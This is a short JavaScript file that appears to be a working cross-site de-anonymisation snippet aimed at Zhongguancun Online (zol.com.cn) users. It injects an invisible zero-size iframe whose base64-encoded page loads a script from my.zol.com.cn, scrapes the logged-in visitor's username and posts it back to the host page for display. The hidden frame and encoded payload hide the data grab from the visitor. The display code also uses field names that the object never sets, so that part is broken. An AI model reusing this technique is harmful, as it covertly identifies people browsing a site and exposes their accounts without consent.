// 用户名  个人中心

function e(I) {
  if ('zol' === I.data.source) {
    var e = I.data.d
    console.log(e)
    if (e.code) {
      var d = {
        valid: !0,
        data: {
          username: e.username,
          home: 'http://my.zol.com.cn/'.concat(e.username, '/'),
        },
      }
      console.log(d)

      let innerHTML = `
      <div class='item'>
        <p class='title'>中关村在线</p>
        <p>用户名: ${d.data.userName}</p>
        <p>个人主页: ${d.data.homePage}</p>
      </div>
    `
      let dom = document.createElement('div')
      dom.innerHTML = innerHTML
      document.getElementById('content').appendChild(dom)
    }
  }
}
function zhongguancun() {
  var C = document.createElement('iframe')
  C.src =
    'data:text/html;base64,PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+em9sLmNvbS5jbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjxkaXYgaWQ9Im1zZ19uIj4KCjwvZGl2Pgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBmdW5jdGlvbiBnZXRVc2VyTmFtZSgpIHsKICAgICAgICBsZXQgaW5mbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtc2dfbicpLmlubmVySFRNTC5zcGxpdCgnLycpOwogICAgICAgIGxldCBkYXRhID0ge30KICAgICAgICBpZiAoaW5mby5sZW5ndGggPCA0KSB7CiAgICAgICAgCWRhdGEuY29kZSA9IGZhbHNlCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAJZGF0YS5jb2RlID0gdHJ1ZQogICAgICAgIAlkYXRhLnVzZXJuYW1lID0gaW5mb1szXQogICAgICAgIH0KICAgICAgICBsZXQgZCA9IHtzb3VyY2U6ICJ6b2wiLCBkOiBkYXRhfTsKICAgICAgICB3aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKGQsICIqIik7CiAgICB9Cjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cDovL215LnpvbC5jb20uY24vcHVibGljX25ldy5waHAiIG9ubG9hZD0iZ2V0VXNlck5hbWUoKSI+Cgo8L3NjcmlwdD4KCjwvaHRtbD4='
  C.width = 0
  C.height = 0
  C.style.borderWidth = 0
  document.documentElement.appendChild(C)
}
window.addEventListener('message', e, !1)
// window.addEventListener('load', function () {
zhongguancun()
// })
